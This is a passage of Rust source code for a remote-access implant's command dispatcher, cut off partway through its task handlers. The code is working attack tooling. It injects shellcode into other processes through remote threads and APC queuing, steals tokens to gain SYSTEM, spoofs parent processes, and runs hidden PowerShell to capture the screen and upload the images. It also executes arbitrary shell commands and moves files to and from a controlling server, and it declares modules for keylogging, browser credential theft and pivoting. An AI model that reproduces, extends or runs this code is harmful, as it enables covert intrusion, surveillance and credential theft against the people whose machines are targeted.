/// Command dispatcher — full task parity with the Go/Nim agents.

// Declare sibling source files via explicit path so main.rs stays untouched.
// Rust resolves #[path] relative to the directory of the declaring file (src/).
#[cfg(target_os = "windows")]
#[path = "kerberos.rs"]
mod kerberos;
#[cfg(target_os = "windows")]
#[path = "pe_exec.rs"]
mod pe_exec;
#[cfg(target_os = "windows")]
#[path = "commands_injection.rs"]
mod commands_injection;
#[cfg(target_os = "windows")]
#[path = "commands_tokens.rs"]
mod commands_tokens;
#[cfg(target_os = "windows")]
#[path = "commands_defense.rs"]
mod commands_defense;
#[cfg(target_os = "windows")]
#[path = "commands_utils.rs"]
mod commands_utils;
#[path = "commands_ishell.rs"]
mod commands_ishell;
#[cfg(target_os = "windows")]
#[path = "keylog.rs"]
mod keylog;
#[path = "socks.rs"]
mod socks;
#[cfg(target_os = "windows")]
#[path = "browser_creds.rs"]
mod browser_creds;
#[cfg(target_os = "windows")]
#[path = "clipboard.rs"]
mod clipboard;
#[path = "rsocks.rs"]
mod rsocks;
#[path = "http_pivot.rs"]
mod http_pivot;
#[path = "tcp_pivot.rs"]
mod tcp_pivot;

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::process::Command;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use crate::transport::{AgentTransport, TaskWire};

pub static DYN_SLEEP_SEC:  AtomicU64 = AtomicU64::new(u64::MAX);
pub static DYN_JITTER_PCT: AtomicU64 = AtomicU64::new(u64::MAX);

static DYN_WORKING_HOURS: OnceLock<Mutex<String>> = OnceLock::new();
fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
    DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
}

// ── Screenwatch globals (Windows only) ───────────────────────────────────────

#[cfg(target_os = "windows")]
static SCREENWATCH_STOP: AtomicBool = AtomicBool::new(false);
#[cfg(target_os = "windows")]
static SCREENWATCH_HANDLE: OnceLock<Mutex<Option<std::thread::JoinHandle<()>>>> = OnceLock::new();

#[cfg(target_os = "windows")]
fn screenwatch_handle() -> std::sync::MutexGuard<'static, Option<std::thread::JoinHandle<()>>> {
    SCREENWATCH_HANDLE.get_or_init(|| Mutex::new(None)).lock().unwrap()
}

#[cfg(target_os = "windows")]
fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u64) {
    SCREENWATCH_STOP.store(false, Ordering::Relaxed);
    let handle = std::thread::spawn(move || {
        let sc_ps = concat!(
            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
            "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]",
            "::PrimaryScreen.Bounds.Width,",
            "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
            "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
            "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
            "$ms=[System.IO.MemoryStream]::new();",
            "$bmp.Save($ms,'Png');",
            "[Convert]::ToBase64String($ms.ToArray())"
        );
        while !SCREENWATCH_STOP.load(Ordering::Relaxed) {
            if let Ok(o) = Command::new("powershell.exe")
                .args(["-NoP", "-NonI", "-W", "Hidden", "-C", sc_ps])
                .output()
            {
                if o.status.success() {
                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if let Ok(png) = STANDARD.decode(&b64) {
                        let enc = crate::crypto::seal(&aes_key, &png);
                        let path = format!("/upload/{}/screenwatch.png", agent_id);
                        crate::transport::http_do("POST", &path, &enc);
                    }
                }
            }
            // Sleep in small increments so STOP flag is checked frequently
            let mut slept_ms = 0u64;
            let limit_ms = interval_sec * 1000;
            while slept_ms < limit_ms && !SCREENWATCH_STOP.load(Ordering::Relaxed) {
                std::thread::sleep(std::time::Duration::from_millis(250));
                slept_ms += 250;
            }
        }
    });
    *screenwatch_handle() = Some(handle);
}

// ── Shell helpers ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn shell(cmd: &str) -> String {
    match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

#[cfg(not(target_os = "windows"))]
fn shell(cmd: &str) -> String {
    match Command::new("sh").args(["-c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

#[cfg(target_os = "windows")]
fn ps(script: &str) -> String {
    match Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

#[cfg(target_os = "windows")]
fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

// ── Native Windows helpers ────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, LUID, PAPCFUNC,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, OpenThread, GetCurrentProcess, QueueUserAPC,
    OpenProcessToken, CreateProcessW, ResumeThread,
    InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
    PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS, THREAD_SET_CONTEXT,
    EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    STARTUPINFOEXW, PROCESS_INFORMATION, LPPROC_THREAD_ATTRIBUTE_LIST,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx,
    GetProcessHeap, HeapAlloc, HeapFree,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory, GetThreadContext, SetThreadContext,
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::VirtualProtect;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next,
    Process32First, Process32Next,
    THREADENTRY32, PROCESSENTRY32, TH32CS_SNAPTHREAD, TH32CS_SNAPPROCESS,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Security::{
    DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
    AdjustTokenPrivileges, LookupPrivilegeValueW,
    LogonUserW, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
    SecurityImpersonation, TokenImpersonation,
    TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES,
    SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
};

#[cfg(target_os = "windows")]
unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
    let name_w = wide(priv_name);
    let mut luid: LUID = std::mem::zeroed();
    if LookupPrivilegeValueW(std::ptr::null(), name_w.as_ptr(), &mut luid) == 0 { return false; }
    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
    };
    AdjustTokenPrivileges(htok, 0, &tp, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
        std::ptr::null_mut(), std::ptr::null_mut()) != 0
}

#[cfg(target_os = "windows")]
unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
    let mut old = 0u32;
    VirtualProtectEx(hproc, mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
    let start: windows_sys::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(mem));
    let mut tid = 0u32;
    let ht = CreateRemoteThread(hproc, std::ptr::null(), 0, start, std::ptr::null(), 0, &mut tid);
    CloseHandle(hproc);
    if ht == 0 { return format!("CreateRemoteThread failed (err {})", GetLastError()); }
    CloseHandle(ht);
    format!("[+] injected {} bytes into PID {} (TID={})", sc.len(), pid, tid)
}

#[cfg(target_os = "windows")]
unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE { CloseHandle(hproc); return "snapshot failed".into(); }
    let mut te: THREADENTRY32 = std::mem::zeroed();
    te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut queued = 0u32;
    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == pid {
                let ht = OpenThread(THREAD_SET_CONTEXT, 0, te.th32ThreadID);
                if ht != 0 {
                    let apc_fn: PAPCFUNC =
                        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(usize)>(mem));
                    QueueUserAPC(apc_fn, ht, 0);
                    CloseHandle(ht);
                    queued += 1;
                }
            }
            if Thread32Next(snap, &mut te) == 0 { break; }
        }
    }
    CloseHandle(snap);
    CloseHandle(hproc);
    format!("[+] APC queued to {} thread(s) in PID {}", queued, pid)
}

#[cfg(target_os = "windows")]
unsafe fn token_steal(pid: u32) -> String {
    let mut hself = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
        enable_priv(hself, "SeDebugPrivilege");
        CloseHandle(hself);
    }
    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mut htok = 0isize;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);
    let mut hdup = 0isize;
    DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityImpersonation, TokenImpersonation, &mut hdup);
    CloseHandle(htok);
    if hdup == 0 { return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
    if ImpersonateLoggedOnUser(hdup) == 0 {
        CloseHandle(hdup);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(hdup);
    format!("[+] impersonating token from PID {}", pid)
}

#[cfg(target_os = "windows")]
unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
    let wu = wide(user); let wd = wide(domain); let wp = wide(pass);
    let mut htok = 0isize;
    if LogonUserW(wu.as_ptr(), wd.as_ptr(), wp.as_ptr(),
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &mut htok) == 0 {
        return format!("LogonUser failed (err {})", GetLastError());
    }
    if ImpersonateLoggedOnUser(htok) == 0 {
        CloseHandle(htok);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(htok);
    format!("[+] impersonating {}\\{}", domain, user)
}

#[cfg(target_os = "windows")]
unsafe fn get_system() -> String {
    let mut hself = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
        enable_priv(hself, "SeDebugPrivilege");
        CloseHandle(hself);
    }
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut sys_pid = 0u32;
    if Process32First(snap, &mut pe) != 0 {
        loop {
            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
            if name.eq_ignore_ascii_case("winlogon.exe") { sys_pid = pe.th32ProcessID; break; }
            if Process32Next(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    if sys_pid == 0 { return "winlogon.exe not found".into(); }
    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sys_pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mut htok = 0isize;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);
    let mut hdup = 0isize;
    DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityImpersonation, TokenImpersonation, &mut hdup);
    CloseHandle(htok);
    if hdup == 0 { return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
    if ImpersonateLoggedOnUser(hdup) == 0 {
        CloseHandle(hdup);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(hdup);
    format!("[+] SYSTEM token (winlogon PID={})", sys_pid)
}

#[cfg(target_os = "windows")]
unsafe fn spawn_with_ppid(cmd: &str, parent_name: &str) -> String {
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut parent_pid = 0u32;
    if Process32First(snap, &mut pe) != 0 {
        loop {
            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
            if name.eq_ignore_ascii_case(parent_name) { parent_pid = pe.th32ProcessID; break; }
            if Process32Next(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    if parent_pid == 0 { return format!("process '{}' not found", parent_name); }

    let hparent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
    if hparent == 0 { return format!("OpenProcess(parent) failed (err {})", GetLastError()); }

    let mut attr_size = 0usize;
    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
    let heap = GetProcessHeap();
    let attr_list = HeapAlloc(heap, 0, attr_size) as LPPROC_THREAD_ATTRIBUTE_LIST;
    if attr_list.is_null() { CloseHandle(hparent); return "HeapAlloc failed".into(); }
    InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);
    UpdateProcThreadAttribute(
        attr_list, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &hparent as *const HANDLE as *const _,
        std::mem::size_of::<HANDLE>(),
        std::ptr::null_mut(),
        std::ptr::null(),
    );

    let mut si: STARTUPINFOEXW = std::mem::zeroed();
    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.lpAttributeList = attr_list;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    let mut cmd_w = wide(cmd);
    let ok = CreateProcessW(
        std::ptr::null(), cmd_w.as_mut_ptr(),
        std::ptr::null(), std::ptr::null(), 0,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        std::ptr::null(), std::ptr::null(),
        &si.StartupInfo, &mut pi,
    );
    DeleteProcThreadAttributeList(attr_list);
    HeapFree(heap, 0, attr_list as *const _);
    CloseHandle(hparent);
    if ok == 0 {
        return format!("CreateProcessW failed (err {})", GetLastError());
    }
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    format!("[+] spawned '{}' (PID={}) with parent {}({})", cmd, pi.dwProcessId, parent_name, parent_pid)
}

// ── Sysinfo ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn sysinfo() -> String {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
    format!(
        "hostname={}\nusername={}\nos=windows/{}\npid={}",
        hostname, username, arch, std::process::id()
    )
}

#[cfg(not(target_os = "windows"))]
fn sysinfo() -> String {
    let hostname = std::fs::read_to_string("/proc/sys/kernel/hostname")
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| std::env::var("HOSTNAME").unwrap_or_else(|_| "UNKNOWN".into()));
    let username = std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_else(|_| "UNKNOWN".into());
    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
    let os_name = std::fs::read_to_string("/etc/os-release")
        .map(|s| {
            s.lines()
                .find(|l| l.starts_with("PRETTY_NAME="))
                .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
                .unwrap_or_else(|| "linux".to_string())
        })
        .unwrap_or_else(|_| "linux".to_string());
    format!(
        "hostname={}\nusername={}\nos={}/{}\npid={}",
        hostname, username, os_name, arch, std::process::id()
    )
}

// ── Directory listing ─────────────────────────────────────────────────────────

fn ls(path: &str) -> String {
    let dir = if path.is_empty() {
        std::env::current_dir().unwrap_or_default().to_string_lossy().into_owned()
    } else {
        path.to_string()
    };
    match std::fs::read_dir(&dir) {
        Ok(entries) => entries
            .filter_map(|e| e.ok())
            .map(|e| {
                let kind = if e.path().is_dir() { "D" } else { "F" };
                format!("{}  {}", kind, e.path().display())
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[error: {}]", e),
    }
}

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "SHELL" => {
            t.send_result(task.id, &shell(&task.args), "");
        }
        "SLEEP" => {
            let parts: Vec<&str> = task.args.split_whitespace().collect();
            if let Some(s) = parts.first().and_then(|v| v.parse::<u64>().ok()) {
                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
            }
            if let Some(j) = parts.get(1).and_then(|v| v.parse::<u64>().ok()) {
                DYN_JITTER_PCT.store(j, Ordering::Relaxed);
            }
            t.send_result(task.id, "[+] sleep updated", "");
        }
        "SYSINFO" => {
            t.send_result(task.id, &sysinfo(), "");
        }
        "PS" => {
            #[cfg(target_os = "windows")]
            t.send_result(task.id, &shell("tasklist /FO CSV /NH 2>&1"), "");
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, &shell("ps aux"), "");
        }
        "PWD" => {
            let cwd = std::env::current_dir()
                .map(|p| p.to_string_lossy().into_owned())
                .unwrap_or_else(|e| format!("[error: {}]", e));
            t.send_result(task.id, &cwd, "");
        }
        "CD" => match std::env::set_current_dir(&task.args) {
            Ok(_) => {
                let cwd = std::env::current_dir()
                    .map(|p| p.to_string_lossy().into_owned())
                    .unwrap_or_default();
                t.send_result(task.id, &cwd, "");
            }
            Err(e) => t.send_result(task.id, "", &format!("cd: {}", e)),
        },
        "LS" => {
            t.send_result(task.id, &ls(&task.args), "");
        }
        "LS_JSON" => {
            let dir = if task.args.trim().is_empty() { ".".to_string() } else { task.args.trim().to_string() };
            match std::fs::canonicalize(&dir) {
                Err(e) => {
                    let j = serde_json::json!({"error": e.to_string()});
                    t.send_result(task.id, &j.to_string(), "");
                }
                Ok(abs) => {
                    let abs_str = abs.to_string_lossy().into_owned();
                    let cwd = std::env::current_dir().map(|p| p.to_string_lossy().into_owned()).unwrap_or_default();
                    let mut entries = Vec::new();
                    if let Ok(rd) = std::fs::read_dir(&abs) {
                        for e in rd.flatten() {
                            let name = e.file_name().to_string_lossy().into_owned();
                            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
                            let (sz, modtime) = e.metadata().map(|m| {
                                let sz = if is_dir { 0 } else { m.len() as i64 };
                                let mod_str = m.modified().ok()
                                    .and_then(|t| {
                                        let secs = t.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs();
                                        let dt_secs = secs as i64;
                                        let days = dt_secs / 86400;
                                        let rem  = dt_secs % 86400;
                                        let hh   = rem / 3600;
                                        let mm   = (rem % 3600) / 60;
                                        let mut y = 1970i32; let mut d = days as i32;
                                        loop {
                                            let yd = if (y%4==0&&y%100!=0)||(y%400==0) {366} else {365};
                                            if d < yd { break; } d -= yd; y += 1;
                                        }
                                        let mdays = [31i32,if(y%4==0&&y%100!=0)||(y%400==0){29}else{28},31,30,31,30,31,31,30,31,30,31];
                                        let mut mo = 0usize;
                                        while mo < 12 && d >= mdays[mo] { d -= mdays[mo]; mo += 1; }
                                        Some(format!("{:04}-{:02}-{:02} {:02}:{:02}", y, mo+1, d+1, hh, mm))
                                    }).unwrap_or_default();
                                (sz, mod_str)
                            }).unwrap_or((0, String::new()));
                            entries.push(serde_json::json!({"name":name,"is_dir":is_dir,"size":sz,"mod":modtime}));
                        }
                    }
                    let resp = serde_json::json!({"cwd": cwd, "path": abs_str, "entries": entries});
                    t.send_result(task.id, &resp.to_string(), "");
                }
            }
        }
        "PS_JSON" => {
            #[cfg(target_os = "windows")]
            {
                let raw = shell("tasklist /FO CSV /NH 2>&1");
                let mut procs = Vec::new();
                for line in raw.lines() {
                    let line = line.trim().trim_matches('"');
                    let parts: Vec<&str> = line.splitn(6, "\",\"").collect();
                    if parts.len() >= 2 {
                        let name = parts[0].trim_matches('"');
                        let pid_str = parts[1].trim_matches('"');
                        if let Ok(pid) = pid_str.parse::<u32>() {
                            procs.push(serde_json::json!({"pid": pid, "name": name, "security": ""}));
                        }
                    }
                }
                t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
            }
            #[cfg(not(target_os = "windows"))]
            {
                let raw = shell("ps -eo pid,comm --no-headers 2>/dev/null");
                let mut procs = Vec::new();
                for line in raw.lines() {
                    let parts: Vec<&str> = line.trim().splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        if let Ok(pid) = parts[0].trim().parse::<u32>() {
                            procs.push(serde_json::json!({"pid": pid, "name": parts[1].trim(), "security": ""}));
                        }
                    }
                }
                t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
            }
        }
        #[cfg(target_os = "windows")]
        "DRIVES" => {
            let raw = shell("wmic logicaldisk get name /format:list 2>&1");
            let mut entries = Vec::new();
            for line in raw.lines() {
                let l = line.trim();
                if let Some(rest) = l.strip_prefix("Name=") {
                    let drive = rest.trim();
                    if !drive.is_empty() {
                        entries.push(serde_json::json!({"name": format!("{}\\", drive), "is_dir": true, "size": 0, "mod": ""}));
                    }
                }
            }
            let resp = serde_json::json!({"cwd": "", "path": "", "drives": true, "entries": entries});
            t.send_result(task.id, &resp.to_string(), "");
        }
        #[cfg(target_os = "windows")]
        "NET_SHARES" => {
            let host = task.args.trim().trim_start_matches('\\').trim_start_matches('/');
            let raw = shell(&format!("net view \\\\{} /all 2>&1", host));
            let mut entries = Vec::new();
            let mut parsing = false;
            for line in raw.lines() {
                let l = line.trim();
                if l.contains("---") { parsing = true; continue; }
                if !parsing || l.is_empty() { continue; }
                let lower = l.to_lowercase();
                if lower.contains("completed") || lower.contains("completado") { break; }
                let parts: Vec<&str> = l.split_whitespace().collect();
                if parts.len() >= 2 && matches!(parts[1].to_lowercase().as_str(), "disk" | "disco") {
                    entries.push(serde_json::json!({"name": parts[0], "is_dir": true, "size": 0, "mod": ""}));
                }
            }
            let resp = serde_json::json!({"cwd": "", "path": format!("\\\\{}", host), "shares": true, "entries": entries});
            t.send_result(task.id, &resp.to_string(), "");
        }
        "KILL" => {
            t.send_result(task.id, "bye", "");
            std::process::exit(0);
        }
        "UPLOAD" => {
            // Server pushes file to agent: args = JSON {"filename":"...","remote_path":"..."}
            let j: serde_json::Value = match serde_json::from_str(&task.args) {
                Ok(v) => v,
                Err(e) => {
                    t.send_result(task.id, "", &format!("json parse: {}", e));
                    return;
                }
            };
            let filename    = j["filename"].as_str().unwrap_or("");
            let remote_path = j["remote_path"].as_str().unwrap_or("");
            let data = t.download_file(filename);
            if data.is_empty() {
                t.send_result(task.id, "", "download from server failed");
                return;
            }
            match std::fs::write(remote_path, &data) {
                Ok(_) => t.send_result(
                    task.id,
                    &format!("written {} bytes to {}", data.len(), remote_path),
                    "",
                ),
                Err(e) => t.send_result(task.id, "", &format!("write: {}", e)),
            }
        }
        "DOWNLOAD" => {
            // Agent reads local file and uploads to server
            let path = &task.args;
            let name = std::path::Path::new(path)
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| path.clone());
            match std::fs::read(path) {
                Ok(data) => {
                    let n = data.len();
                    t.upload_file(task.id, &name, &data);
                    t.send_result(task.id, &format!("uploaded {} bytes", n), "");
                }
                Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
            }
        }
        "CAT" => {
            match std::fs::read_to_string(&task.args) {
                Ok(s) => t.send_result(task.id, &s, ""),
                Err(e) => t.send_result(task.id, "", &format!("cat: {}", e)),
            }
        }
        "MKDIR" => {
            match std::fs::create_dir_all(&task.args) {
                Ok(_) => t.send_result(task.id, "[+] created", ""),
                Err(e) => t.send_result(task.id, "", &format!("mkdir: {}", e)),
            }
        }
        "RM" => {
            let r = if std::path::Path::new(&task.args).is_dir() {
                std::fs::remove_dir_all(&task.args)
            } else {
                std::fs::remove_file(&task.args)
            };
            match r {
                Ok(_) => t.send_result(task.id, "[+] removed", ""),
                Err(e) => t.send_result(task.id, "", &format!("rm: {}", e)),
            }
        }
        "ENV" => {
            let out = std::env::vars()
                .map(|(k, v)| format!("{}={}", k, v))
                .collect::<Vec<_>>()
                .join("\n");
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "SCREENSHOT" => {
            let sc_ps = concat!(
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
                "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,",
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
                "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
                "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
                "$ms=[System.IO.MemoryStream]::new();$bmp.Save($ms,'Png');",
                "[Convert]::ToBase64String($ms.ToArray())"
            );
            match Command::new("powershell.exe").args(["-NoP","-NonI","-W","Hidden","-C",sc_ps]).output() {
                Ok(o) if o.status.success() => {
                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if let Ok(png) = STANDARD.decode(&b64) {
                        t.upload_file(task.id, "screenshot.png", &png);
                        t.send_result(task.id, "[+] screenshot uploaded", "");
                    } else { t.send_result(task.id, "", "base64 decode failed"); }
                }
                Ok(o) => t.send_result(task.id, "", &String::from_utf8_lossy(&o.stderr)),
                Err(e) => t.send_result(task.id, "", &format!("screenshot: {}", e)),
            }
        }
        "CONFIG" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            if let Some(s) = j.get("sleep_sec").and_then(|v| v.as_u64()) {
                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
            }
            if let Some(j2) = j.get("jitter_pct").and_then(|v| v.as_u64()) {
                DYN_JITTER_PCT.store(j2, Ordering::Relaxed);
            }
            if let Some(wh) = j.get("working_hours").and_then(|v| v.as_str()) {
                *dyn_working_hours() = wh.to_string();
            }
            t.send_result(task.id, "[+] config updated", "");
        }
        #[cfg(target_os = "windows")]
        "INJECT_REMOTE" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "INJECT_REMOTE requires {\"pid\":N}"); return; }
            let r = unsafe { inject_remote(pid, &task.payload) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "INJECT_APC" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
